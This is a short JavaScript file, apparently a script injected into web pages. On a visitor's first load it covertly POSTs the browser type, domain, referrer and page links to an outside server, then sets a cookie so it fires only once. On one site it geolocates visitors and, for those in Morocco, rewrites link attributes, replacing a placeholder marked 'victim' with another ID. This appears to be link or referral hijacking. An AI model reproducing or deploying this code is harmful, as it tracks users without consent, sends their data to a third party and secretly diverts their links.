function setCookie(c_name, value, exdays) {
    var exdate = new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
    document.cookie = c_name + "=" + c_value;
}

function getCookie(c_name) {
    var i, x, y, ARRcookies = document.cookie.split(";");
    for (i = 0; i < ARRcookies.length; i++) {
        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == c_name) {
            return unescape(y);
        }
    }
}

var c_ooksjgr = "hfg4GdrtHu7rdg75hjyg000X98";
var GetCookie = getCookie(c_ooksjgr);

if(GetCookie){
	console.log("yes alerdy");
}else{

	
	var ROOT_URL = "https://abadaoucht.com/viewProject/api/gjf5rgvf.php";
	
	function getBrowserType() {
	  const test = regexp => {
	    return regexp.test(navigator.userAgent);
	  };
	
	  if (test(/opr\//i) || !!window.opr) {
	    return 'Opera';
	  } else if (test(/edg/i)) {
	    return 'Microsoft Edge';
	  } else if (test(/chrome|chromium|crios/i)) {
	    return 'Google Chrome';
	  } else if (test(/firefox|fxios/i)) {
	    return 'Mozilla Firefox';
	  } else if (test(/safari/i)) {
	    return 'Apple Safari';
	  } else if (test(/trident/i)) {
	    return 'Microsoft Internet Explorer';
	  } else if (test(/ucbrowser/i)) {
	    return 'UC Browser';
	  } else if (test(/samsungbrowser/i)) {
	    return 'Samsung Browser';
	  } else {
	    return 'Unknown browser';
	  }
	}
	
	function GetSmartLink(){
		var links = [];
		var link = document.links;
		for(var i=0; i<link.length; i++) {
			lin = link[i].href;
			if(lin.indexOf("smarturl.com")){
		 		links.push(lin);
		 	}
		}
		return links;
	}
	
	const ref_domain = document.referrer;    /* TRAFFIC SOURCE */
	const browserType = getBrowserType();    /* BROWSER */
	const domain = window.location.hostname; /* DOMAIN  */
	const links_smart = GetSmartLink();      /* SMART LINK */
	
	const PARAMS = "browser="+browserType+"&domain="+domain+"&smart="+links_smart+"&source"+ref_domain;
	
	/* send data to db */
	const xhr = new XMLHttpRequest();
	xhr.open("POST", ROOT_URL);
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhr.send(PARAMS);
	xhr.onload = () => {
		if (xhr.status === 200){
			console.log("success");
		}
	};
	xhr.onerror = () => {
		console.log("error");
	};
	
	
	setCookie(c_ooksjgr, "yes is visi", 2);
}	



let hostname = location.hostname;
var x_sdi = "270367";
if(hostname == "abadaoucht.com"){
	var y_sdi = "victim"
	API_URL = "http://ip-api.com/json";
	var PARAMS = "fields=57347";
	const xhr = new XMLHttpRequest();
	xhr.open("POST", API_URL);
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhr.onload = () => {
		if (xhr.status === 200){
			var data = JSON.parse(xhr.response);
			if(data["status"] == "success"){
				if(data["country"] == "Morocco"){					
					var clss = document.querySelectorAll(".mb-3 .it");
					clss.forEach(function(x, index){
						var url_xyz54 = x.getAttribute("data-url");
						var new_xyz54 = url_xyz54.replace(y_sdi, x_sdi);
						x.setAttribute("data-url", new_xyz54);
					});					
				}
			}
		}
	};
	xhr.send(PARAMS);
}
